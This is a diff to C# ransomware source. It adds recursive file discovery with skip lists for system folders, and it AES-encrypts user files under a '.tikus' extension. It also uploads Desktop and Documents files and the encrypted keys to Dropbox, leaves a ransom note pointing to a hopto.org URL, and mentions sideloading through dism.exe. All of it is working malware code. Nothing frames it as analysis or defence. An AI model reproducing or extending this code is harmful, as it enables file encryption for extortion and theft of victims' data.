@@ -340,7 +340,7 @@ All your files have been encrypted. I don't ask for money. All I want is a chees
     \ \_) (o)   /
     \/________/ 
 
-Send me this to get your file back : http://charmys.hopto.org:8080/
+Send me this to get your file back : http://charmys.hopto.org:35478/
 
 {encCPrivKey}
             
@@ -428,8 +428,56 @@ sKB2dDA=
 -----END PGP PUBLIC KEY BLOCK-----
 ";
 
+        //https://stackoverflow.com/questions/19570611/how-to-ignore-an-exception-and-continue-processing-a-foreach-loop
         public static readonly string userName = Environment.UserName;
         public static readonly string uid = $"{Environment.MachineName}-{Environment.UserName}";
+
+        private static Dictionary<DirectoryInfo, List<string>> validDirs = new Dictionary<DirectoryInfo, List<string>>();
+        private static List<string> logger = new List<string>();
+
+        private static List<string> uselessFilesAndFolders = new List<string> { ".git", "ineedcheese", "System32", "AppData", "Windows" };
+        private static List<string> whitelistExtensions = new List<string> { "exe", "tikus", "key", "pub", "iv", "idx", "dll", "pdb", "ini" };
+        private static string baseDir = $@"C:\Users\{userName}\Desktop\aniqfakhrul";
+
+        static void RecursiveSearch(string root)
+        {
+            string[] files = null;
+            string[] subDirs = null;
+
+            // First, process all the files directly under this folder 
+            try
+            {
+                files = Directory.EnumerateFiles(root).Where(i => !whitelistExtensions.Any(x => i.Contains(x))).ToArray();
+            }
+            catch (UnauthorizedAccessException e)
+            {
+                logger.Add(e.Message);
+            }
+            catch (System.IO.DirectoryNotFoundException e)
+            {
+                Console.WriteLine(e.Message);
+            }
+
+            if (files != null)
+            {
+
+                validDirs.Add(new DirectoryInfo(root), files.ToList());
+                subDirs = Directory.GetDirectories(root);
+
+                foreach (string dir in subDirs)
+                {
+                      RecursiveSearch(dir);
+                }
+            }
+        }
+
+
+
+        //method to check
+        static bool isExcluded(List<string> exludedDirList, string target)
+        {
+            return exludedDirList.Any(d => new DirectoryInfo(target).Name.Contains(d));
+        }
 
         // this export call can be used sideloaded with \windows\system32\dism.exe, dismcore.dll
         [DllExport]
@@ -437,18 +485,13 @@ sKB2dDA=
         {
             //start firefox
             //StartProcess("firefox.exe");
-            var baseDir = $@"C:\Users\{userName}\Desktop\encme";
 
             var ransomFormat = ".tikus";
-
-            var whitelistExtensions = new List<string> { "exe", "tikus", "key", "pub", "iv", "idx", "dll" };
 
             var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
             var folderToExtract = new List<string> { userDesktopPath, "Documents" };
 
-            List<string> uselessFilesAndFolders = new List<string> { ".git", "ineedcheese", "System32" };
-            
             //var SPubKey = PemToXml("-----BEGIN PUBLIC KEY-----\r\n" + SPubKeyOneLine + "\r\n-----END PUBLIC KEY-----");
 
             if (Directory.Exists(baseDir))
@@ -484,11 +527,9 @@ sKB2dDA=
                 byte[] aes_iv = Random.GetRandomIV();
                 byte[] encIVKey = Asymmetric.RSA.Encrypt(aes_iv, publicKey);
 
-                var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories);
+                //var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories).Where(d => !isExcluded(uselessFilesAndFolders, d));
 
                 byte[] encrypted;
-
-
 
                 //write aes_key and aes_iv
                 //byte[] aesKeyByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("AXe8YwuIn1zxt3FPWTZFlAa14EHdPAdN9FaZ9RQWihc="), publicKey);
@@ -512,52 +553,56 @@ sKB2dDA=
                 UploadKeys(encIVKey, "aes.iv", uid);
                 //File.WriteAllBytes(Path.Combine(baseDir, "aes.iv"), encIVKey);
 
-                foreach (var file in targetDirs) // .Where(dir => uselessFilesAndFolders.Any(x => !dir.Contains(x)))
+                RecursiveSearch(baseDir);
+
+                foreach (var listFiles in validDirs.Values)
                 {
-
-                    var newFileExtension = $"{file}{ransomFormat}";
-                    var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
-
-                    if (!File.Exists(newFileExtension))
+                    foreach(var file in listFiles)
                     {
-                        if (!whitelistExtensions.Any(x => file.EndsWith(x)) && !uselessFilesAndFolders.Any(x => file.Contains(x)))
+                        var newFileExtension = $"{file}{ransomFormat}";
+                        var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
+
+                        if (!file.EndsWith(ransomFormat))
                         {
-                            try
+                            if(!uselessFilesAndFolders.Any(x => file.Contains(x)))
                             {
-                                Console.WriteLine($"Full {file}");
-                                var outFolder = Path.Combine(uid, file.Replace(baseDir, "").Trim('\\'));
-                                outFolder = outFolder.Replace("\\", "/");
-                                Console.WriteLine($"ALtered: {outFolder}");
-                                Console.WriteLine(file.Remove(file.IndexOf(baseDir)));
-                                var fileContent = File.ReadAllBytes(file);
-
-                                if (folderToExtract.Any(i => file.Contains(i)))
+                                try
                                 {
-                                    //upload file to google drive (do in background)
-                                    var task = Task.Run(() => Dropbox.UploadFile(Dropbox.dbx, file, outFolder));
-                                    task.Wait();
+                                    //Console.WriteLine($"Full {file}");
+                                    var outFolder = Path.Combine(uid, Path.GetDirectoryName(file).Replace(baseDir, "").Trim('\\'));
+                                    outFolder = outFolder.Replace("\\", "/");
+                                    //Console.WriteLine($"ALtered: {outFolder}");
+                                    var fileContent = File.ReadAllBytes(file);
+
+                                    if (folderToExtract.Any(i => file.Contains(i)))
+                                    {
+                                        //upload file to google drive (do in background)
+                                        var task = Task.Run(() => Dropbox.UploadFile(Dropbox.dbx, file, outFolder));
+                                        task.Wait();
+                                    }
+
+                                    //encrypted = Asymmetric.RSA.Encrypt(fileContent, publicKey);
+                                    encrypted = AES.AESEncrypt(fileContent, aes_key, aes_iv);
+
+                                    File.WriteAllBytes(file, encrypted);
+
+                                    File.Move(file, newFileExtension);
+
+                                    if (!File.Exists(ransomNotePath))
+                                        LeaveRansomNote(ransomNotePath, encCPrivKey);
+
                                 }
+                                catch
+                                {
 
-                                //encrypted = Asymmetric.RSA.Encrypt(fileContent, publicKey);
-                                encrypted = AES.AESEncrypt(fileContent, aes_key, aes_iv);
-
-                                File.WriteAllBytes(file, encrypted);
-                                
-                                File.Move(file, newFileExtension);
-
-                                if (!File.Exists(ransomNotePath))
-                                    LeaveRansomNote(ransomNotePath, encCPrivKey);
-
+                                }
                             }
-                            catch
-                            {
-
-                            }
-
 
                         }
-
                     }
+                    
+
+                    
 
                 }
             }
